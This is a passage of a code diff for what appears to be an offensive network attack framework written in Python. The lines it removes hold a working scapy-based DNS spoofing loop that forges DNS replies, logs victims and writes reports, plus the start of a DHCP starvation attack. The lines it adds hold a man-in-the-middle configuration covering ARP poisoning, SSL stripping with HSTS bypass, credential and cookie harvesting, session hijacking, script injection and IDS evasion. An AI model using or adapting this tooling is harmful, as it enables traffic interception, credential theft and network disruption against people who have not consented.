-                'confirm_spoof': self._parse_bool(self.module_options.get('confirm_spoof', 'true')),
-                'auto_stop_timer': int(self.module_options.get('auto_stop_timer', '0')),
-                'max_spoofs': int(self.module_options.get('max_spoofs', '0')),
-                'backup_dns': self._parse_bool(self.module_options.get('backup_dns', 'true')),
-                'restore_on_exit': self._parse_bool(self.module_options.get('restore_on_exit', 'true'))
-            }
-            
-            return config
-        except Exception as e:
-            print(f"Error loading config: {str(e)}")
-            return None
-
-
-    def _display_dns_spoof_config(self, config):
-        """Display DNS spoof configuration"""
-        from colorama import Fore, Style
-        
-        print(f"{Fore.CYAN}{'=' * 70}")
-        print(f"  CONFIGURATION")
-        print(f"{'=' * 70}{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW}  Campaign:{Style.RESET_ALL}")
-        print(f"    • Name:            {Fore.WHITE}{config['campaign_name']}{Style.RESET_ALL}")
-        print(f"    • Interface:       {Fore.WHITE}{config['interface']}{Style.RESET_ALL}")
-        print(f"    • Listen Port:     {Fore.WHITE}{config['listen_port']}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Spoofing:{Style.RESET_ALL}")
-        print(f"    • Spoof IP:        {Fore.WHITE}{config['spoof_ip']}{Style.RESET_ALL}")
-        print(f"    • Wildcard Mode:   {Fore.GREEN if config['wildcard_mode'] else Fore.RED}{'✓' if config['wildcard_mode'] else '✗'}{Style.RESET_ALL}")
-        print(f"    • Response Type:   {Fore.WHITE}{config['response_type']}{Style.RESET_ALL}")
-        print(f"    • TTL:             {Fore.WHITE}{config['ttl']}s{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Upstream DNS:{Style.RESET_ALL}")
-        print(f"    • Primary:         {Fore.WHITE}{config['upstream_dns']}{Style.RESET_ALL}")
-        print(f"    • Fallback:        {Fore.WHITE}{config['fallback_dns']}{Style.RESET_ALL}")
-        print(f"    • DoH:             {Fore.GREEN if config['dns_over_https'] else Fore.RED}{'✓' if config['dns_over_https'] else '✗'}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Cache:{Style.RESET_ALL}")
-        print(f"    • Enabled:         {Fore.GREEN if config['enable_cache'] else Fore.RED}{'✓' if config['enable_cache'] else '✗'}{Style.RESET_ALL}")
-        if config['enable_cache']:
-            print(f"    • Cache Size:      {Fore.WHITE}{config['cache_size']} entries{Style.RESET_ALL}")
-            print(f"    • Cache TTL:       {Fore.WHITE}{config['cache_ttl']}s{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.YELLOW}  Database:{Style.RESET_ALL}")
-        print(f"    • Enabled:         {Fore.GREEN if config['enable_database'] else Fore.RED}{'✓' if config['enable_database'] else '✗'}{Style.RESET_ALL}")
-        if config['enable_database']:
-            print(f"    • DB File:         {Fore.WHITE}{config['db_file']}{Style.RESET_ALL}")
-        
-        print()
-
-
-    def _initialize_dns_database(self, config):
-        """Initialize SQLite database for DNS operations"""
-        import sqlite3
-        
-        conn = sqlite3.connect(config['db_file'])
-        cursor = conn.cursor()
-        
-        # Campaigns table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS campaigns (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                name TEXT NOT NULL,
-                interface TEXT,
-                start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                end_time TIMESTAMP,
-                queries_total INTEGER DEFAULT 0,
-                queries_spoofed INTEGER DEFAULT 0,
-                unique_clients INTEGER DEFAULT 0,
-                status TEXT DEFAULT 'active'
-            )
-        ''')
-        
-        # DNS queries table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS dns_queries (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                client_ip TEXT,
-                query_domain TEXT,
-                query_type TEXT,
-                response_ip TEXT,
-                spoofed BOOLEAN DEFAULT 0,
-                ttl INTEGER,
-                upstream_used TEXT,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # DNS responses table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS dns_responses (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                query_domain TEXT,
-                response_data TEXT,
-                response_type TEXT,
-                cached BOOLEAN DEFAULT 0,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # Clients table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS clients (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                ip_address TEXT UNIQUE,
-                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                query_count INTEGER DEFAULT 0,
-                tool_fingerprint TEXT,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # Statistics table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS statistics (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                campaign_id INTEGER,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                metric_name TEXT,
-                metric_value INTEGER,
-                FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
-            )
-        ''')
-        
-        # Insert campaign record
-        cursor.execute('''
-            INSERT INTO campaigns (name, interface)
-            VALUES (?, ?)
-        ''', (config['campaign_name'], config['interface']))
-        
-        conn.commit()
-        conn.close()
-
-
-    def _initialize_dns_cache(self, config):
-        """Initialize DNS cache"""
-        self.dns_cache = {}
-        self.cache_timestamps = {}
-        self.cache_hits = 0
-        self.cache_misses = 0
-
-
-    def _load_spoof_domains(self, config):
-        """Load domains to spoof"""
-        domains = []
-        
-        # Load from config string
-        if config['spoof_domains']:
-            domains.extend([d.strip() for d in config['spoof_domains'].split(',')])
-        
-        # Load from file
-        if config['domain_file']:
-            try:
-                with open(config['domain_file'], 'r') as f:
-                    domains.extend([line.strip() for line in f if line.strip()])
-            except Exception as e:
-                # Silently handle exception - consider logging in production
-                if hasattr(self, "debug") and getattr(self, "debug", False):
-                    print(f"[DEBUG] Exception: {e}")
-        
-        return list(set(domains))  # Remove duplicates
-
-
-    def _dns_spoof_loop(self, config, spoof_domains):
-        """Main DNS spoofing loop"""
-        from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send
-        from colorama import Fore, Style
-        import time
-        import random
-        
-        spoof_count = 0
-        query_count = 0
-        start_time = time.time()
-        
-        def process_dns_packet(packet):
-            nonlocal spoof_count, query_count
-            
-            try:
-                if packet.haslayer(DNS) and packet.haslayer(DNSQR):
-                    query = packet[DNSQR].qname.decode('utf-8').rstrip('.')
-                    qtype = packet[DNSQR].qtype
-                    client_ip = packet[IP].src
+                config = {
+                    # Core
+                    'campaign_name': str(self.module_options.get('campaign_name', 'mitm_operation')),
+                    'interface': str(self.module_options.get('interface', 'eth0')),
+                    'target_ip': str(self.module_options.get('target_ip', '192.168.1.100')),
+                    'gateway_ip': str(self.module_options.get('gateway_ip', '192.168.1.1')),
+                    'target_list': str(self.module_options.get('target_list', '')),
+                    'mode': str(self.module_options.get('mode', 'bidirectional')),
                     
-                    query_count += 1
+                    # ARP poisoning
+                    'poison_interval': int(self.module_options.get('poison_interval', '2')),
+                    'poison_count': int(self.module_options.get('poison_count', '0')),
+                    'restore_arp': self._parse_bool(self.module_options.get('restore_arp', 'true')),
+                    'enable_ip_forward': self._parse_bool(self.module_options.get('enable_ip_forward', 'true')),
+                    'spoof_mac': str(self.module_options.get('spoof_mac', '')),
+                    'random_mac': self._parse_bool(self.module_options.get('random_mac', 'false')),
                     
-                    # Check if domain should be spoofed
-                    should_spoof = False
+                    # MITM attacks
+                    'enable_packet_capture': self._parse_bool(self.module_options.get('enable_packet_capture', 'true')),
+                    'enable_ssl_strip': self._parse_bool(self.module_options.get('enable_ssl_strip', 'true')),
+                    'enable_dns_spoof': self._parse_bool(self.module_options.get('enable_dns_spoof', 'true')),
+                    'enable_credential_harvest': self._parse_bool(self.module_options.get('enable_credential_harvest', 'true')),
+                    'enable_session_hijack': self._parse_bool(self.module_options.get('enable_session_hijack', 'false')),
+                    'enable_traffic_injection': self._parse_bool(self.module_options.get('enable_traffic_injection', 'false')),
+                    'enable_downgrade_attack': self._parse_bool(self.module_options.get('enable_downgrade_attack', 'true')),
                     
-                    if config['wildcard_mode']:
-                        should_spoof = True
-                    else:
-                        if query in spoof_domains:
-                            should_spoof = True
-                        elif config['subdomain_mode']:
-                            for domain in spoof_domains:
-                                if query.endswith(domain):
-                                    should_spoof = True
-                                    break
+                    # Packet capture
+                    'capture_filter': str(self.module_options.get('capture_filter', '')),
+                    'capture_protocols': str(self.module_options.get('capture_protocols', 'all')),
+                    'capture_file': str(self.module_options.get('capture_file', 'mitm_capture.pcap')),
+                    'capture_limit': int(self.module_options.get('capture_limit', '0')),
+                    'save_raw_data': self._parse_bool(self.module_options.get('save_raw_data', 'true')),
+                    'save_dissected': self._parse_bool(self.module_options.get('save_dissected', 'true')),
                     
-                    # Apply conditional filters
-                    if should_spoof and config['source_ip_filter']:
-                        allowed_ips = config['source_ip_filter'].split(',')
-                        if client_ip not in allowed_ips:
-                            should_spoof = False
+                    # Credential harvesting
+                    'harvest_http': self._parse_bool(self.module_options.get('harvest_http', 'true')),
+                    'harvest_ftp': self._parse_bool(self.module_options.get('harvest_ftp', 'true')),
+                    'harvest_smtp': self._parse_bool(self.module_options.get('harvest_smtp', 'true')),
+                    'harvest_pop3': self._parse_bool(self.module_options.get('harvest_pop3', 'true')),
+                    'harvest_imap': self._parse_bool(self.module_options.get('harvest_imap', 'true')),
+                    'harvest_telnet': self._parse_bool(self.module_options.get('harvest_telnet', 'true')),
+                    'harvest_ssh_keys': self._parse_bool(self.module_options.get('harvest_ssh_keys', 'false')),
+                    'harvest_cookies': self._parse_bool(self.module_options.get('harvest_cookies', 'true')),
+                    'harvest_post_data': self._parse_bool(self.module_options.get('harvest_post_data', 'true')),
+                    'log_passwords': self._parse_bool(self.module_options.get('log_passwords', 'true')),
+                    'hash_passwords': self._parse_bool(self.module_options.get('hash_passwords', 'false')),
                     
-                    if should_spoof and config['exclude_ips']:
-                        excluded_ips = config['exclude_ips'].split(',')
-                        if client_ip in excluded_ips:
-                            should_spoof = False
+                    # SSL stripping
+                    'sslstrip_port': int(self.module_options.get('sslstrip_port', '10000')),
+                    'sslstrip_mode': str(self.module_options.get('sslstrip_mode', 'transparent')),
+                    'sslstrip_domains': str(self.module_options.get('sslstrip_domains', '')),
+                    'sslstrip_hsts_bypass': self._parse_bool(self.module_options.get('sslstrip_hsts_bypass', 'true')),
+                    'sslstrip_log': str(self.module_options.get('sslstrip_log', 'sslstrip.log')),
+                    'replace_https_links': self._parse_bool(self.module_options.get('replace_https_links', 'true')),
+                    'fake_ssl_lock': self._parse_bool(self.module_options.get('fake_ssl_lock', 'false')),
                     
-                    # Random spoofing probability
-                    if should_spoof and config['random_spoof']:
-                        if random.randint(0, 100) > config['spoof_probability']:
-                            should_spoof = False
+                    # DNS spoofing
+                    'dns_spoof_domains': str(self.module_options.get('dns_spoof_domains', '')),
+                    'dns_spoof_ip': str(self.module_options.get('dns_spoof_ip', '192.168.1.100')),
+                    'dns_wildcard': self._parse_bool(self.module_options.get('dns_wildcard', 'false')),
+                    'dns_log_queries': self._parse_bool(self.module_options.get('dns_log_queries', 'true')),
+                    'dns_fake_responses': str(self.module_options.get('dns_fake_responses', '')),
+                    'dns_upstream': str(self.module_options.get('dns_upstream', '8.8.8.8')),
                     
-                    if should_spoof:
-                        # Build spoofed response
-                        spoof_response = IP(dst=client_ip, src=packet[IP].dst) / \
-                                       UDP(dport=packet[UDP].sport, sport=53) / \
-                                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                                           an=DNSRR(rrname=packet[DNSQR].qname,
-                                                   ttl=config['ttl'],
-                                                   rdata=config['spoof_ip']))
-                        
-                        send(spoof_response, verbose=False, iface=config['interface'])
-                        
-                        spoof_count += 1
-                        
-                        # Display alert
-                        print(f"{Fore.GREEN}[+] SPOOFED:{Style.RESET_ALL} {client_ip} → {query} → {config['spoof_ip']}")
-                        
-                        # Log to database
-                        if config['enable_database']:
-                            self._log_dns_query(config, client_ip, query, qtype, config['spoof_ip'], True)
-                        
-                        # Check max spoofs limit
-                        if config['max_spoofs'] > 0 and spoof_count >= config['max_spoofs']:
-                            print(f"\n{Fore.YELLOW}⚠  Max spoofs limit reached{Style.RESET_ALL}")
-                            return True  # Stop sniffing
+                    # Traffic injection
+                    'inject_html': str(self.module_options.get('inject_html', '')),
+                    'inject_javascript': str(self.module_options.get('inject_javascript', '')),
+                    'inject_beef_hook': self._parse_bool(self.module_options.get('inject_beef_hook', 'false')),
+                    'beef_server': str(self.module_options.get('beef_server', 'http://localhost:3000')),
+                    'inject_position': str(self.module_options.get('inject_position', 'body')),
+                    'inject_filter': str(self.module_options.get('inject_filter', 'text/html')),
+                    'replace_images': self._parse_bool(self.module_options.get('replace_images', 'false')),
+                    'replacement_image': str(self.module_options.get('replacement_image', '')),
                     
-                    elif config['log_queries']:
-                        print(f"{Fore.CYAN}[·] QUERY:{Style.RESET_ALL} {client_ip} → {query}")
-                        
-                        if config['enable_database'] and not config['log_spoofed_only']:
-                            self._log_dns_query(config, client_ip, query, qtype, '', False)
+                    # Session hijacking
+                    'hijack_cookies': self._parse_bool(self.module_options.get('hijack_cookies', 'true')),
+                    'hijack_tokens': self._parse_bool(self.module_options.get('hijack_tokens', 'true')),
+                    'hijack_jwt': self._parse_bool(self.module_options.get('hijack_jwt', 'true')),
+                    'session_replay': self._parse_bool(self.module_options.get('session_replay', 'false')),
+                    'cookie_domains': str(self.module_options.get('cookie_domains', '')),
                     
-                    # Display progress
-                    elapsed = int(time.time() - start_time)
-                    print(f"\r{Fore.CYAN}[{elapsed}s] Queries: {query_count} | Spoofed: {spoof_count}{Style.RESET_ALL}", end='', flush=True)
+                    # Protocol downgrade
+                    'downgrade_https': self._parse_bool(self.module_options.get('downgrade_https', 'true')),
+                    'downgrade_ssh': self._parse_bool(self.module_options.get('downgrade_ssh', 'false')),
+                    'downgrade_ftps': self._parse_bool(self.module_options.get('downgrade_ftps', 'true')),
+                    'strip_security_headers': self._parse_bool(self.module_options.get('strip_security_headers', 'true')),
+                    'remove_csp': self._parse_bool(self.module_options.get('remove_csp', 'true')),
+                    'remove_hsts': self._parse_bool(self.module_options.get('remove_hsts', 'true')),
                     
-                    # Check auto-stop timer
-                    if config['auto_stop_timer'] > 0 and elapsed >= config['auto_stop_timer']:
-                        print(f"\n\n{Fore.YELLOW}⚠  Auto-stop timer reached{Style.RESET_ALL}")
-                        return True
-            
-            except Exception as e:
-                # DNS packet processing error - log if debug enabled
-                if config.get('debug'):
-                    print(f"\n[DEBUG] DNS processing error: {e}")
-        
-        try:
-            # Start sniffing DNS traffic
-            sniff(filter=f"udp port 53", prn=process_dns_packet, iface=config['interface'], store=0)
-        
-        except KeyboardInterrupt as e:
-            # Silently handle KeyboardInterrupt
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] KeyboardInterrupt: {e}")
-        
-        print(f"\n\n{Fore.YELLOW}━━━ STOPPING DNS SPOOFING ━━━{Style.RESET_ALL}\n")
-
-
-    def _log_dns_query(self, config, client_ip, domain, qtype, response_ip, spoofed):
-        """Log DNS query to database"""
-        import sqlite3
-        try:
-            conn = sqlite3.connect(config['db_file'])
-            cursor = conn.cursor()
-            
-            cursor.execute('''
-                INSERT INTO dns_queries (campaign_id, client_ip, query_domain, query_type, response_ip, spoofed)
-                VALUES (1, ?, ?, ?, ?, ?)
-            ''', (client_ip, domain, qtype, response_ip, spoofed))
-            
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            # Silently handle exception - consider logging in production
-            if hasattr(self, "debug") and getattr(self, "debug", False):
-                print(f"[DEBUG] Exception: {e}")
-
-
-    def _cleanup_dns_spoof(self, config):
-        """Cleanup and generate reports"""
-        from colorama import Fore, Style
-        
-        print(f"{Fore.CYAN}→ Cleaning up...{Style.RESET_ALL}")
-        
-        # Generate final report
-        if config['generate_report']:
-            print(f"{Fore.CYAN}→ Generating final report...{Style.RESET_ALL}")
-            self._generate_dns_report(config)
-            print(f"{Fore.GREEN}✓ Report generated{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}\n")
-
-
-    def _generate_dns_report(self, config):
-        """Generate DNS spoofing report"""
-        formats = config['report_format']
-        if formats == 'all':
-            formats = ['txt', 'json', 'html']
-        else:
-            formats = [formats]
-        
-        for fmt in formats:
-            report_file = f"dns_report_{config['campaign_name']}.{fmt}"
-            
-            if fmt == 'txt':
-                self._generate_dns_txt_report(config, report_file)
-            elif fmt == 'json':
-                self._generate_dns_json_report(config, report_file)
-            elif fmt == 'html':
-                self._generate_dns_html_report(config, report_file)
-
-
-    def _generate_dns_txt_report(self, config, output_file):
-        """Generate text report"""
-        import sqlite3
-        import time
-        
-        content = f"""DNS SPOOFING OPERATION - FINAL REPORT
-{'=' * 70}
-
-Campaign: {config['campaign_name']}
-Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
-
-CONFIGURATION
--------------
-Interface:      {config['interface']}
-Spoof IP:       {config['spoof_ip']}
-Wildcard Mode:  {config['wildcard_mode']}
-Response Type:  {config['response_type']}
-TTL:            {config['ttl']} seconds
-
-UPSTREAM DNS
-------------
-Primary:        {config['upstream_dns']}
-Fallback:       {config['fallback_dns']}
-DNS-over-HTTPS: {config['dns_over_https']}
-
-"""
-        
-        # Get statistics from database
-        if config['enable_database']:
-            try:
-                conn = sqlite3.connect(config['db_file'])
-                cursor = conn.cursor()
-                
-                cursor.execute('SELECT COUNT(*) FROM dns_queries WHERE campaign_id = 1')
-                total_queries = cursor.fetchone()[0]
-                
-                cursor.execute('SELECT COUNT(*) FROM dns_queries WHERE campaign_id = 1 AND spoofed = 1')
-                spoofed_queries = cursor.fetchone()[0]
-                
-                cursor.execute('SELECT COUNT(DISTINCT client_ip) FROM dns_queries WHERE campaign_id = 1')
-                unique_clients = cursor.fetchone()[0]
-                
-                content += f"""STATISTICS
-----------
-Total Queries:      {total_queries}
-Spoofed Queries:    {spoofed_queries}
-Legitimate Queries: {total_queries - spoofed_queries}
-Unique Clients:     {unique_clients}
-Success Rate:       {(spoofed_queries/total_queries*100) if total_queries > 0 else 0:.1f}%
-
-"""
-                
-                # Top spoofed domains
-                if config['include_top_domains']:
-                    content += "TOP SPOOFED DOMAINS\n"
-                    content += "-" * 70 + "\n"
+                    # Anti-detection
+                    'stealth_mode': self._parse_bool(self.module_options.get('stealth_mode', 'true')),
+                    'randomize_timing': self._parse_bool(self.module_options.get('randomize_timing', 'true')),
+                    'spoof_vendor': str(self.module_options.get('spoof_vendor', '')),
+                    'avoid_ids': self._parse_bool(self.module_options.get('avoid_ids', 'true')),
+                    'fragment_packets': self._parse_bool(self.module_options.get('fragment_packets', 'false')),
+                    'ttl_manipulation': self._parse_bool(self.module_options.get('ttl_manipulation', 'false')),
                     
-                    cursor.execute('''
-                        SELECT query_domain, COUNT(*) as count 
-                        FROM dns_queries 
-                        WHERE campaign_id = 1 AND spoofed = 1
-                        GROUP BY query_domain 
-                        ORDER BY count DESC 
-                        LIMIT 10
-                    ''')
+                    # Monitoring
+                    'monitor_bandwidth': self._parse_bool(self.module_options.get('monitor_bandwidth', 'true')),
+                    'monitor_connections': self._parse_bool(self.module_options.get('monitor_connections', 'true')),
+                    'monitor_protocols': self._parse_bool(self.module_options.get('monitor_protocols', 'true')),
+                    'detect_anomalies': self._parse_bool(self.module_options.get('detect_anomalies', 'false')),
+                    'log_all_traffic': self._parse_bool(self.module_options.get('log_all_traffic', 'false')),
+                    'traffic_analysis': self._parse_bool(self.module_options.get('traffic_analysis', 'true')),
                     
-                    for row in cursor.fetchall():
-                        content += f"  {row[0]:<40} {row[1]:>5} queries\n"
+                    # Database & logging
+                    'enable_database': self._parse_bool(self.module_options.get('enable_database', 'true')),
+                    'db_file': str(self.module_options.get('db_file', 'mitm_operations.db')),
+                    'log_file': str(self.module_options.get('log_file', 'arp_spoof.log')),
+                    'log_level': str(self.module_options.get('log_level', 'info')),
+                    'log_format': str(self.module_options.get('log_format', 'detailed')),
+                    'log_rotation': self._parse_bool(self.module_options.get('log_rotation', 'true')),
+                    'max_log_size': int(self.module_options.get('max_log_size', '100')),
                     
-                    content += "\n"
-                
-                # Top clients
-                if config['include_clients']:
-                    content += "TOP CLIENTS\n"
-                    content += "-" * 70 + "\n"
+                    # Targets
+                    'target_mode': str(self.module_options.get('target_mode', 'single')),
+                    'subnet_scan': self._parse_bool(self.module_options.get('subnet_scan', 'false')),
+                    'subnet_range': str(self.module_options.get('subnet_range', '192.168.1.0/24')),
+                    'exclude_ips': str(self.module_options.get('exclude_ips', '')),
+                    'only_active': self._parse_bool(self.module_options.get('only_active', 'true')),
+                    'max_targets': int(self.module_options.get('max_targets', '50')),
                     
-                    cursor.execute('''
-                        SELECT client_ip, COUNT(*) as count 
-                        FROM dns_queries 
-                        WHERE campaign_id = 1
-                        GROUP BY client_ip 
-                        ORDER BY count DESC 
-                        LIMIT 10
-                    ''')
+                    # Advanced
+                    'enable_ettercap': self._parse_bool(self.module_options.get('enable_ettercap', 'false')),
+                    'enable_bettercap': self._parse_bool(self.module_options.get('enable_bettercap', 'false')),
+                    'custom_filters': str(self.module_options.get('custom_filters', '')),
+                    'transparent_proxy': self._parse_bool(self.module_options.get('transparent_proxy', 'false')),
+                    'proxy_port': int(self.module_options.get('proxy_port', '8080')),
+                    'upstream_proxy': str(self.module_options.get('upstream_proxy', '')),
                     
-                    for row in cursor.fetchall():
-                        content += f"  {row[0]:<20} {row[1]:>5} queries\n"
-                
-                conn.close()
-            except Exception as e:
-                # Silently handle exception - consider logging in production
-                if hasattr(self, "debug") and getattr(self, "debug", False):
-                    print(f"[DEBUG] Exception: {e}")
-        
-        with open(output_file, 'w') as f:
-            f.write(content)
-
-
-    def _generate_dns_json_report(self, config, output_file):
-        """Generate JSON report"""
-        import json
-        import sqlite3
-        import time
-        
-        report = {
-            'campaign': config['campaign_name'],
-            'timestamp': time.time(),
-            'configuration': {
-                'interface': config['interface'],
-                'spoof_ip': config['spoof_ip'],
-                'wildcard_mode': config['wildcard_mode'],
-                'upstream_dns': config['upstream_dns']
-            },
-            'statistics': {},
-            'top_domains': [],
-            'top_clients': []
-        }
-        
-        # Get data from database
-        if config['enable_database']:
-            try:
-                conn = sqlite3.connect(config['db_file'])
-                cursor = conn.cursor()
-                
-                cursor.execute('SELECT COUNT(*) FROM dns_queries WHERE campaign_id = 1')
-                total = cursor.fetchone()[0]
-                
-                cursor.execute('SELECT COUNT(*) FROM dns_queries WHERE campaign_id = 1 AND spoofed = 1')
-                spoofed = cursor.fetchone()[0]
-                
-                report['statistics'] = {
-                    'total_queries': total,
-                    'spoofed_queries': spoofed,
-                    'legitimate_queries': total - spoofed
+                    # Reporting
+                    'generate_report': self._parse_bool(self.module_options.get('generate_report', 'true')),
+                    'report_format': str(self.module_options.get('report_format', 'all')),
+                    'report_interval': int(self.module_options.get('report_interval', '60')),
+                    'include_pcap': self._parse_bool(self.module_options.get('include_pcap', 'true')),
+                    'include_credentials': self._parse_bool(self.module_options.get('include_credentials', 'true')),
+                    'include_statistics': self._parse_bool(self.module_options.get('include_statistics', 'true')),
+                    'visualize_traffic': self._parse_bool(self.module_options.get('visualize_traffic', 'false')),
+                    
+                    # Alerts
+                    'enable_alerts': self._parse_bool(self.module_options.get('enable_alerts', 'true')),
+                    'alert_on_credentials': self._parse_bool(self.module_options.get('alert_on_credentials', 'true')),
+                    'alert_on_sessions': self._parse_bool(self.module_options.get('alert_on_sessions', 'true')),
+                    'alert_method': str(self.module_options.get('alert_method', 'console')),
+                    'webhook_url': str(self.module_options.get('webhook_url', '')),
+                    'email_to': str(self.module_options.get('email_to', '')),
+                    
+                    # Safety
+                    'dry_run': self._parse_bool(self.module_options.get('dry_run', 'false')),
+                    'test_mode': self._parse_bool(self.module_options.get('test_mode', 'false')),
+                    'interactive': self._parse_bool(self.module_options.get('interactive', 'false')),
+                    'auto_stop_timer': int(self.module_options.get('auto_stop_timer', '0')),
+                    'confirm_targets': self._parse_bool(self.module_options.get('confirm_targets', 'true')),
+                    'backup_arp_tables': self._parse_bool(self.module_options.get('backup_arp_tables', 'true')),
+                    
+                    # Performance
+                    'threads': int(self.module_options.get('threads', '4')),
+                    'buffer_size': int(self.module_options.get('buffer_size', '65536')),
+                    'queue_size': int(self.module_options.get('queue_size', '1000')),
+                    'timeout': int(self.module_options.get('timeout', '30')),
+                    'retry_count': int(self.module_options.get('retry_count', '3')),
+                    'optimize_performance': self._parse_bool(self.module_options.get('optimize_performance', 'true'))
                 }
                 
-                cursor.execute('''
-                    SELECT query_domain, COUNT(*) 
-                    FROM dns_queries 
-                    WHERE campaign_id = 1 AND spoofed = 1
-                    GROUP BY query_domain 
-                    ORDER BY COUNT(*) DESC 
-                    LIMIT 10
-                ''')
-                
-                for row in cursor.fetchall():
-                    report['top_domains'].append({'domain': row[0], 'count': row[1]})
-                
-                conn.close()
+                return config
             except Exception as e:
-                # Silently handle exception - consider logging in production
-                if hasattr(self, "debug") and getattr(self, "debug", False):
-                    print(f"[DEBUG] Exception: {e}")
-        
-        with open(output_file, 'w') as f:
-            json.dump(report, f, indent=2)
-
-
-    def _generate_dns_html_report(self, config, output_file):
-        """Generate HTML report"""
-        import time
-        
-        html = f"""<!DOCTYPE html>
-<html>
-<head>
-    <title>DNS Report - {config['campaign_name']}</title>
-    <style>
-        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
-        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
-        h1 {{ color: #333; border-bottom: 3px solid #3498db; padding-bottom: 10px; }}
-        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
-        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
-        th {{ background: #3498db; color: white; }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>DNS Spoofing Operation Report</h1>
-        <p><strong>Campaign:</strong> {config['campaign_name']}</p>
-        <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
-        
-        <h2>Configuration</h2>
-        <table>
-            <tr><td><strong>Interface</strong></td><td>{config['interface']}</td></tr>
-            <tr><td><strong>Spoof IP</strong></td><td>{config['spoof_ip']}</td></tr>
-            <tr><td><strong>Wildcard Mode</strong></td><td>{config['wildcard_mode']}</td></tr>
-            <tr><td><strong>Upstream DNS</strong></td><td>{config['upstream_dns']}</td></tr>
-        </table>
-    </div>
-</body>
-</html>"""
-        
-        with open(output_file, 'w') as f:
-            f.write(html)
-
+                print(f"Error loading config: {str(e)}")
+                return None
     
-    def run_dhcp_starvation(self):
-        """
-        Enterprise DHCP Starvation & Exhaustion Platform
-        Complete DHCP attack framework with pool exhaustion and rogue server deployment
-        """
-        from colorama import Fore, Style
-        import time
-        import random
-        
-        print(f"\n{Fore.CYAN}{'=' * 70}")
-        print(f"  DHCP STARVATION & EXHAUSTION PLATFORM - ENTERPRISE EDITION")
-        print(f"{'=' * 70}{Style.RESET_ALL}\n")
-        
-        # Check for scapy
-        try:
-            from scapy.all import (
-                BOOTP, DHCP, Ether, IP, UDP, RandMAC, 
-                sendp, sniff, conf, get_if_hwaddr
-            )
-            SCAPY_AVAILABLE = True
-        except ImportError:
-            print(f"{Fore.RED}✗ ERROR: Scapy not available{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}\n")
-            return
-        
-        # Check root privileges
-        import os
-        if os.geteuid() != 0:
-            print(f"{Fore.RED}✗ ERROR: Root privileges required{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Run with: sudo python3 kndys.py{Style.RESET_ALL}\n")
-            return
-        
-        # Load configuration
-        config = self._load_dhcp_starvation_config()
-        if not config:
-            print(f"{Fore.RED}✗ ERROR: Failed to load configuration{Style.RESET_ALL}")
-            return
-        
-        # Display configuration
-        self._display_dhcp_starvation_config(config)
-        
-        # Confirm operation
-        if config['confirm_attack']:
-            response = input(f"\n{Fore.YELLOW}⚠  WARNING: This attack will exhaust DHCP pool and disrupt network!")
-            response2 = input(f"{Fore.YELLOW}   Proceed with DHCP starvation? (yes/no): {Style.RESET_ALL}")
-            if response2.lower() not in ['yes', 'y']:
-                print(f"{Fore.BLUE}ℹ  Operation cancelled{Style.RESET_ALL}")
-                return
-        
-        # Initialize database
-        if config['enable_database']:
-            try:
-                self._initialize_dhcp_database(config)
-                print(f"\n{Fore.GREEN}✓ Database initialized{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"\n{Fore.YELLOW}⚠ WARNING: Database init failed - continuing without DB{Style.RESET_ALL}")
-        
-        # Detect DHCP server
-        if not config['dhcp_server']:
-            print(f"{Fore.CYAN}→ Detecting DHCP server...{Style.RESET_ALL}")
-            dhcp_server = self._detect_dhcp_server(config)
-            if dhcp_server:
-                config['dhcp_server'] = dhcp_server
-                print(f"{Fore.GREEN}✓ DHCP server detected: {dhcp_server}{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.YELLOW}⚠ WARNING: No DHCP server detected - continuing anyway{Style.RESET_ALL}")
-        
-        # Setup signal handlers
-        import signal
-        import sys
-        
-        def signal_handler(sig, frame):
